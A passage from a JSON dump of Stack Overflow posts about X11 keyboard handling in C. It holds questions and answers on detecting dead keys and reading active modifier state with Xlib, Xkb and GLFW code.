35885615, "link": "https://stackoverflow.com/questions/35885615/get-a-list-of-dead-keys-in-x11/35886417#35886417", "title": "Get a list of dead keys in X11", "body": "<p>I understand you need to know which key will not directly produce a character, maybe because you are writing a game and do not want to have it use keys as input that would require another key to be pressed to produce some output (if so, please mention in the question)</p>\n\n<p>Not through standard Xlib calls, to my knowledge, and definitely not without actually <em>pressing</em> the respective key. Composing is entirely done within Xlib, and transparent to the front end. (For its original purpose, it should be as transparent as possible to work properly, after all)</p>\n\n<p>You could, however, do the same thing that Xlib does and parse through the various <em>Compose</em> configuration files starting with $HOME/.Xcompose. But that could be a tedious process.</p>\n\n<p>On second thought, I am <strong>definitely not proposing the following:</strong></p>\n\n<p>You could, for each key you are looking for information, create a synthetic keypress event and feed it into <em>XLookupString</em>. Hand in an emptied XComposeStatus structure as well. If the structure returns modified, this could be a strong hint you have found a compose key. But it could also mean the server modifies it without any need..... If I were very desparate, I'd probably try.</p>\n"}], "owner": {"reputation": 3975, "user_id": 3560981, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/8fa10e8d564dd93ece697b0aebe689dd?s=128&d=identicon&r=PG&f=1", "display_name": "Nidhoegger", "link": "https://stackoverflow.com/users/3560981/nidhoegger"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 283, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1457517637, "creation_date": 1457508984, "question_id": 35885615, "link": "https://stackoverflow.com/questions/35885615/get-a-list-of-dead-keys-in-x11", "title": "Get a list of dead keys in X11", "body": "<p>Is there a way to check for dead keys in the current layout? I am currently capturing the users input for a project I am doing. I created a map of all keys on the keyboard, but there seems to be no flag or whatsoever defining a key as dead or not. I use <code>libxkb</code> in my current code.</p>\n\n<p>The layout is retrieved using</p>\n\n<pre><code>KeySym * keysyms = XGetKeyboardMapping(display_, keycode_low, keycode_high - keycode_low + 1, &amp;num_keysym);\n</code></pre>\n"}, {"tags": ["c", "linux", "keyboard", "x11"], "answers": [{"comments": [{"owner": {"reputation": 8493, "user_id": 2954547, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/a859521339cfc1d7bc8a3d3da7031cab?s=128&d=identicon&r=PG&f=1", "display_name": "shadowtalker", "link": "https://stackoverflow.com/users/2954547/shadowtalker"}, "edited": false, "score": 1, "creation_date": 1562682880, "post_id": 35957665, "comment_id": 100448253, "body": "Everything is returned in the form of a bitmask, in an <code>XkbStateRec</code> struct. See <a href=\"https://www.x.org/releases/X11R7.6/doc/libX11/specs/XKB/xkblib.html#determining_keyboard_state\" rel=\"nofollow noreferrer\">here</a> for documentation. Here the <code>base_group</code> and <code>base_mods</code> consist of keys and modifiers that are physically &quot;pressed&quot;, or reported as such to X11."}], "tags": [], "owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "is_accepted": false, "score": 2, "last_activity_date": 1457785885, "creation_date": 1457785885, "answer_id": 35957665, "question_id": 35885572, "link": "https://stackoverflow.com/questions/35885572/get-status-of-currently-active-modifiers-in-x11/35957665#35957665", "title": "Get status of currently active modifiers in X11", "body": "<p>No, this is not a list of modifiers. This is a list of modifier keys.</p>\n\n<p>X11 modifiers are <code>ShiftMask</code>, <code>Mod1Mask</code> etc. Logical modifiers are different from the physical keys. Left shift and right shift keys result in the same modifier mask. </p>\n\n<p>If you need the modifier mask, then every X11 key and button event contains a mask of active modifiers in the <code>state</code> member. If you are using Xkb (you probably should), there is <code>XkbGetState</code>.</p>\n\n<p>I don't know of any way to get the state of a physical key, other than monitoring key press and key release events.</p>\n"}, {"tags": [], "owner": {"reputation": 1046, "user_id": 857427, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/6LEqw.jpg?s=128&g=1", "display_name": "Aozi", "link": "https://stackoverflow.com/users/857427/aozi"}, "is_accepted": false, "score": 3, "last_activity_date": 1607241689, "last_edit_date": 1607241689, "creation_date": 1607241290, "answer_id": 65165888, "question_id": 35885572, "link": "https://stackoverflow.com/questions/35885572/get-status-of-currently-active-modifiers-in-x11/65165888#65165888", "title": "Get status of currently active modifiers in X11", "body": "<p>The correct way to do this is exactly as follows:</p>\n<p>Upon receiving KeyPress event, you take the XKeyEvent data, and take the state from it, and convert it as follows (this is a part of GLFW internal mechanism of handling X11 events <a href=\"https://github.com/glfw/glfw/blob/7e8da57094281c73a0be5669a4b79686b4917f6c/src/x11_window.c#L186\" rel=\"nofollow noreferrer\">https://github.com/glfw/glfw/blob/7e8da57094281c73a0be5669a4b79686b4917f6c/src/x11_window.c#L186</a>):</p>\n<pre><code>static int translateState(int state)\n{\n    int mods = 0;\n\n    if (state &amp; ShiftMask)\n        mods |= GLFW_MOD_SHIFT;\n    if (state &amp; ControlMask)\n        mods |= GLFW_MOD_CONTROL;\n    if (state &amp; Mod1Mask)\n        mods |= GLFW_MOD_ALT;\n    if (state &amp; Mod4Mask)\n        mods |= GLFW_MOD_SUPER;\n    if (state &amp; LockMask)\n        mods |= GLFW_MOD_CAPS_LOCK;\n    if (state &amp; Mod2Mask)\n        mods |= GLFW_MOD_NUM_LOCK;\n\n    return mods;\n}\n</code></pre>\n<p>You call that function like:</p>\n<pre><code>translateState(xev.xkey.state);\n</code></pre>\n<p>where xev is the XEvent you have received. Of course you should use your own flags instead of GLFW enumeration, or do something else with it.</p>\n"}], "owner": {"reputation": 3975, "user_id": 3560981, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/8fa10e8d564dd93ece697b0aebe689dd?s=128&d=identicon&r=PG&f=1", "display_name": "Nidhoegger", "link": "https://stackoverflow.com/users/3560981/nidhoegger"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1018, "favorite_count": 1, "answer_count": 2, "score": 3, "last_activity_date": 1607241689, "creation_date": 1457508852, "question_id": 35885572, "link": "https://stackoverflow.com/questions/35885572/get-status-of-currently-active-modifiers-in-x11", "title": "Get status of currently active modifiers in X11", "body": "<p>Is there a way to get informations on current active modifiers in X? E.g. if Capslock is active, if shift is pressed, etc.</p>\n\n<p>According to the <code>xkbcommon-keysyms.h</code> this is a list of all X11 modifiers:</p>\n\n<pre><code>#define XKB_KEY_Shift_L                       0xffe1  /* Left shift */\n#define XKB_KEY_Shift_R                       0xffe2  /* Right shift */\n#define XKB_KEY_Control_L                     0xffe3  /* Left control */\n#define XKB_KEY_Control_R                     0xffe4  /* Right control */\n#define XKB_KEY_Caps_Lock                     0xffe5  /* Caps lock */\n#define XKB_KEY_Shift_Lock                    0xffe6  /* Shift lock */\n\n#define XKB_KEY_Meta_L                        0xffe7  /* Left meta */\n#define XKB_KEY_Meta_R                        0xffe8  /* Right meta */\n#define XKB_KEY_Alt_L                         0xffe9  /* Left alt */\n#define XKB_KEY_Alt_R                         0xffea  /* Right alt */\n#define XKB_KEY_Super_L                       0xffeb  /* Left super */\n#define XKB_KEY_Super_R                       0xffec  /* Right super */\n#define XKB_KEY_Hyper_L                       0xffed  /* Left hyper */\n#define XKB_KEY_Hyper_R                       0xffee  /* Right hyper */\n</code></pre>\n\n<p>But how can I get the status of these keys? I did not find an according function for this. Thanks in advance!</p>\n"}]